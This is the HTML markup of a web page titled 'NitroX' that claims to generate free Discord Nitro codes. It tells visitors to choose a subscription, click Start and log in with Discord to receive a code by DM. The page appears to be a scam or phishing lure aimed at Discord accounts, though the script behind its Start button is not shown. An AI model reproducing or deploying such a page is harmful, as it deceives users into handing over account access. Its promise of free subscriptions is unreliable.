  <body>
  
<div class="navbar">
  <p class="logo">Nitro<strong>X</strong></p>
  <div class="border" style="border: 0 !important;">

  </div>
</div>
<div class="header">
 <h1 style="color: #f0f0f0; font-size: 40px; font-family: 'Noto Serif Georgian', serif;">Generate free discord nitro! No human verification!!</h1>
 <h3 style="color: #e6e6e6; font-size: 68px; margin-top: 25px; font-family: 'Noto Serif Georgian', serif;"><a href="#generator"><button type="button" class="btn btn-outline-dark" style="font-size: 20px;">Generate</button></a></h3>
</div>
<div class="page">


  <div id="generator">
    <h4 style="text-align: center;">How it Works?</h4>
    <p style="margin-left: 24px; margin-right: 15px;"><b>Step 1:</b> Choose a Subscribtion & Click "Start" <br><b>Step 2:</b> Login with Discord <br><b>Step 3:</b> You Will Get a DM Once Our Bot Generates a Working Code!!</p>
    <!-- Checked Custom Checkbox -->
<div class="custom-control custom-checkbox mb-3">
  <input type="checkbox" class="custom-control-input" id="customCheck1" checked>
  <label class="custom-control-label" for="customCheck1">Nitro Classic (1 month)</label>
</div>

<!-- Disabled Custom Checkbox -->
<div class="custom-control custom-checkbox mb-3">
  <input type="checkbox" class="custom-control-input" id="customCheck3" disabled>
  <label class="custom-control-label" for="customCheck3">Nitro (currently unavailable)</label>
</div>

<button type="button" onclick="start()" class="btn btn-outline-success" style="left: 50%; margin: 0; position: absolute; -ms-transform: translate(-50%, -50%); top: 65%; transform: translate(-50%, -50%);">Start</button>
  </div>


</div>
